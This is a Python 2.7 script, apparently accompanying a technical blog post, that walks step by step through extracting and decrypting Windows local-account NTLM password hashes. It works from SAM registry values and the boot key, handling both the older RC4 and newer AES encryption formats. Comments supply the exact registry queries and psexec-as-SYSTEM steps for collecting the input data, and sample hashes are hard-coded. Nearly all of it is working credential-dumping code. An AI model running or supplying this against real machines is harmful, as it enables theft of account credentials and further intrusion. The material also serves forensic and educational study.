#!python2.7
'''
I interpreted and reused code from:
https://github.com/rapid7/rex-powershell/blob/master/spec/file_fixtures/powerdump.ps1
As of Win10 v1607 (>10.0.14393), the HASH encoding changed ...
Accompanying blog post: http://www.insecurity.be/blog/2018/01/21/retrieving-ntlm-hashes-and-what-changed-technical-writeup/
'''
print('#################### By Tijl Deneut ###########################')
print('This scripts requires \'pycrypto\' to run (which requires http://aka.ms/vcpython27 on Windows)')
print('Let me guide you, you require psexec to extract stuff from the registry')
print('Please open the code to add the required data')
## What I need from you:
# > User RID (e.g. for Administrator this is '500' or '1F4'), can be found with
# wmic useraccount where name='Administrator' get sid
RID = 500
# > RegistryHash for user ID above, can be found with cmd as System:
# reg query "hklm\sam\sam\domains\account\users\000001F4" | find "V" > %temp%\adminenchash.txt && notepad %temp%\adminenchash.txt
HexRegHash = '00000000F400000002000100F40000001A00000000000000100100000000000000000000100100006C000000000000007C01000000000000000000007C01000000000000000000007C01000000000000000000007C01000000000000000000007C01000000000000000000007C01000000000000000000007C01000000000000000000007C01000015000000A80000009401000008000000010000009C0100001800000000000000B40100003800000000000000EC010000180000000000000004020000180000000000000001001480D4000000E40000001400000044000000020030000200000002C014004400050101010000000000010000000002C01400FFFF1F000101000000000005070000000200900004000000000014005B03020001010000000000010000000000001800FF070F0001020000000000052000000020020000000038001B030200010A00000000000F0300000000040000DEA22867213ED2AF19AD5D79B0C107292756FC20D8AD66F610F268FADF2AF80F0000240044000200010500000000000515000000AEAD0F17744EFAAA4E42D564F40100000102000000000005200000002002000001020000000000052000000020020000410064006D0069006E006900730074007200610074006F0072000D0F4200750069006C0074002D0069006E0020006100630063006F0075006E007400200066006F0072002000610064006D0069006E006900730074006500720069006E0067002000740068006500200063006F006D00700075007400650072002F0064006F006D00610069006E00FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF0001000102000007000000030002000000000019E019C9BAB887A2249FF09ABB46471503000200100000006D59CBE78A9468F4853C654E078BCD46562ACE54C9B1CF001EA3D604E97FD80EE1AE05C23A2D801CF0F200AFB9F2E3E20300020000000000C115545B6446AF39F22A0416D1E16B500300020000000000A29F2D9AD08083FEF1D81ACF18202663'
# > RegistryHash for encrypted System Key, can be found with cmd as System:
# reg query "hklm\SAM\SAM\Domains\Account" /v F | find "BINARY" > %temp%\sysk.txt && notepad %temp%\sysk.txt
HexRegSysk = '02000100000000008922ABD40ABBD00102000000000000000080A60AFFDEFFFF0000000000000000000000000000008000CC1DCFFBFFFFFF00CC1DCFFBFFFFFF0000000000000000EA03000000000000000000000000000001000000030000000100000000000100010000003800000070A7884DA3FA7F816CBD324E7AC3996F97700B19AB0FA48F3F5FED8ED046C6800D46426B8A38966C5E0963469F6DB0930000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000038000000DD4EFAEE9909FAC10C3184FD2E5BCFCEDE87D82F0DAEA73417E2850654CD9C7ED3AFF93CB2010B59DA9B8D1FEC3FBC140000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000300000000000000'
# > hBootKey Class Names, 4 values can be found with regedit as System:
# 'HKLM\System\CurrentControlSet\Control\Lsa' as text and open with notepad
jd = '5d5991a3'
skew1 = '486c0596'
gbg = '5af83341'
data = '3f2cceb9'
raw_input('Press Enter to continue')

import binascii, md5, os
os.system('cls' if os.name == 'nt' else 'clear')

## Data and key as hex string ('ABCDEFGH')
def decryptRC4(data, key):
    data = binascii.unhexlify(data)
    key = binascii.unhexlify(key)
    S = range(256)
    j = 0
    for i in range(256):
        j = (j + S[i] + ord(key[i % len(key)])) % 256
        S[i] , S[j] = S[j] , S[i]
    i = 0
    j = 0
    result=''
    for char in data:
        i = ( i + 1 ) % 256
        j = ( j + S[i] ) % 256
        S[i] , S[j] = S[j] , S[i]
        result += chr(ord(char) ^ S[(S[i] + S[j]) % 256])
    return binascii.hexlify(result)

## Data and key as hex string ('ABCDEFGH')
def decryptAES(data, key, iv):
    try: from Crypto.Cipher import AES
    except:
        print('Error: Crypto not found, please run "pip install pycrypto" as admin')
        raw_input('Press Enter to exit')
        exit()
    data = binascii.unhexlify(data)
    key = binascii.unhexlify(key)
    iv = binascii.unhexlify(iv)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return binascii.hexlify(cipher.decrypt(data))

## Data and key as hex string ('ABCDEFGH')
def decryptDES(data, key):
    try: from Crypto.Cipher import DES
    except:
        print('Error: Crypto not found, please run "pip install pycrypto" as admin')
        raw_input('Press Enter to exit')
        exit()
    data = binascii.unhexlify(data)
    key = binascii.unhexlify(key)
    cipher = DES.new(key, DES.MODE_ECB)
    return binascii.hexlify(cipher.decrypt(data))

def str_to_key(dessrc):
    bkey = binascii.unhexlify(dessrc)
    keyarr = []
    for i in range(0,len(bkey)): keyarr.append(int(binascii.hexlify(bkey[i]),16))
    bytearr = []
    bytearr.append(keyarr[0]>>1)
    bytearr.append(((keyarr[0] & 0x01) << 6) | keyarr[1] >> 2)
    bytearr.append(((keyarr[1] & 0x03) << 5) | keyarr[2] >> 3)
    bytearr.append(((keyarr[2] & 0x07) << 4) | keyarr[3] >> 4)
    bytearr.append(((keyarr[3] & 0x0F) << 3) | keyarr[4] >> 5)
    bytearr.append(((keyarr[4] & 0x1F) << 2) | keyarr[5] >> 6)
    bytearr.append(((keyarr[5] & 0x3F) << 1) | keyarr[6] >> 7)
    bytearr.append(keyarr[6]&0x7F)
    result = ''
    for b in bytearr:
        bit = bin(b*2)[2:].zfill(8)
        if bit.count('1')% 2  == 0: ## Even parity so RMB bitflip needed
            result += hex((b * 2) ^ 1)[2:].zfill(2)
        else:
            result += hex(b * 2)[2:].zfill(2)
    return result

################# MAIN FUNCTION IN STEPS #################
RegHash = binascii.unhexlify(HexRegHash)
UsernameOffset = int(binascii.hexlify(RegHash[0xc]), 16) + 0xcc
UsernameLength = int(binascii.hexlify(RegHash[0xc+4]),16)
Username = RegHash[UsernameOffset:UsernameOffset+UsernameLength].replace('\x00','')
print('Username (offset 0xc): ' + Username + "\n")

print('####### ---- STEP1, extract the double encrypted NTLM Hash ---- #######')
Offset = HexRegHash[0xA8*2:(0xA8+4)*2] ## Offset like 'a0010000'
HexOffset = "0x"+"".join(map(str.__add__, Offset[-2::-2], Offset[-1::-2])) ## Offset like '0x1a0'
NTOffset = int(HexOffset,16)+int("0xcc",16) ## Offset like 0x1a0+0xcc=0x26c
Length = HexRegHash[0xAC*2:(0xAC+4)*2] ## Length like '14000000'
HexLength = "0x"+"".join(map(str.__add__, Length[-2::-2], Length[-1::-2])) ## Length like '0x14'
Length=int(HexLength,16) ## Length like 0x14 (pre 1607) or 0x38 (since 1607)
print('Offset is '+hex(NTOffset)+' and length is '+hex(Length))
Hash = HexRegHash[(NTOffset+4)*2: (NTOffset+4+Length)*2][:32] ## Only 16 bytes needed
if hex(Length)=='0x38':
    print('Detected New Style Hash (AES), need IV')
    Hash = HexRegHash[(NTOffset + 24) * 2: (NTOffset + 24 + Length) * 2][:32] ## Only 16 bytes needed
    IV = HexRegHash[(NTOffset + 8) *2:(NTOffset + 24) * 2] ## IV needed to AES decrypt later
    print('NT IV: ' + IV)
elif not hex(Length)=='0x14':
    print('Error: Length not 0x14, user probably has no password?')
    raw_input('Press Enter to close')
    exit()
print('Double encrypted Hash should be ' + Hash + "\n") ## D4442D6644EDAE736D4F3DFB8FF04F0F


print('####### ---- STEP2, Combine the hBootKey ---- #######')
Scrambled = jd + skew1 + gbg + data
hBootkey = Scrambled[8*2:8*2+2]+Scrambled[5*2:5*2+2]+Scrambled[4*2:4*2+2]+Scrambled[2*2:2*2+2]
hBootkey += Scrambled[11*2:11*2+2]+Scrambled[9*2:9*2+2]+Scrambled[13*2:13*2+2]+Scrambled[3*2:3*2+2]
hBootkey += Scrambled[0*2:0*2+2]+Scrambled[6*2:6*2+2]+Scrambled[1*2:1*2+2]+Scrambled[12*2:12*2+2]
hBootkey += Scrambled[14*2:14*2+2]+Scrambled[10*2:10*2+2]+Scrambled[15*2:15*2+2]+Scrambled[7*2:7*2+2]
print("Your hBootkey/Syskey should be " + hBootkey + "\n") ## 5a6c489141f82ca35d05593fce33b996

print('####### ---- STEP3, use hBootKey to RC4/AES decrypt Syskey ---- #######')
hBootVersion = int(HexRegSysk[0x00:(0x00+1)*2], 16) ## First byte contains version
if hBootVersion==3: ## AES encrypted!
    print('Detected New Style hBootkey Hash too (AES), needs IV')
    hBootIV = HexRegSysk[0x78*2:(0x78+16)*2] ## 16 Bytes iv
    encSysk = HexRegSysk[0x88*2:(0x88+32)*2][:32] ## Only 16 bytes needed
    Syskey = decryptAES(encSysk, hBootkey, hBootIV)
else:
    Part = binascii.unhexlify(HexRegSysk[0x70*2:(0x70+16)*2])
    Qwerty = '!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%'+"\x00"
    hBootkey = binascii.unhexlify(hBootkey)
    Digits = '0123456789012345678901234567890123456789'+"\x00"
    RC4Key = binascii.hexlify(md5.new(Part + Qwerty + hBootkey + Digits).digest())
    encSysk = HexRegSysk[0x80*2:(0x80+32)*2][:32]  ## Only 16 bytes needed
    Syskey = decryptRC4(encSysk, RC4Key)
print('Your Full Syskey/SAMKey should be ' + Syskey + "\n")

print('####### ---- STEP4, use SAM-/Syskey to RC4/AES decrypt the Hash ---- #######')
HexRID = hex(RID)[2:].zfill(8) ## 500 becomes '000001f4'
HexRID = binascii.unhexlify("".join(map(str.__add__, HexRID[-2::-2], HexRID[-1::-2]))) ## '000001f4' becomes 'f4010000'
if hex(Length)=='0x14': ## RC4 Encrypted Hash
    NTPASSWORD = 'NTPASSWORD'+"\x00"
    SYSKEY = binascii.unhexlify(Syskey)
    HashRC4Key = binascii.hexlify(md5.new(SYSKEY+HexRID+NTPASSWORD).digest())
    EncryptedHash = decryptRC4(Hash, HashRC4Key) ## Hash from STEP1, RC4Key from step 3 (76f1327b198c0731ae2611dab42716ea)
if hex(Length)=='0x38': ## AES Encrypted Hash
    EncryptedHash = decryptAES(Hash, Syskey, IV) #494e7ccb2dad245ec2094db427a37ebf6731aed779271e6923cb91a7f6560b0d
print('Your encrypted Hash should be ' + EncryptedHash + "\n") ## a291d14b768a6ac455a0ab9d376d8551

print('####### ---- STEP5, use DES derived from RID to fully decrypt the Hash ---- #######')
DESSOURCE1 = binascii.hexlify(HexRID[0] + HexRID[1] + HexRID[2] + HexRID[3] + HexRID[0] + HexRID[1] + HexRID[2]) ##f4010000 becomes f4010000f40100
DESSOURCE2 = binascii.hexlify(HexRID[3] + HexRID[0] + HexRID[1] + HexRID[2] + HexRID[3] + HexRID[0] + HexRID[1])
## Nextup: The DESSOURCEs above are converted from 7 byte to 8 byte keys (using Odd Parity):
DESKEY1 = str_to_key(DESSOURCE1)
DESKEY2 = str_to_key(DESSOURCE2)
DecryptedHash = decryptDES(EncryptedHash[:16], DESKEY1) + decryptDES(EncryptedHash[16:], DESKEY2)
print('Your decrypted NTLM Hash should be ' + DecryptedHash) ## 32ed87bdb5fdc5e9cba88547376818d4 which is '123456'
print(str(RID)+':aad3b435b51404eeaad3b435b51404ee:'+DecryptedHash+"\n")
raw_input('All done, press Enter')
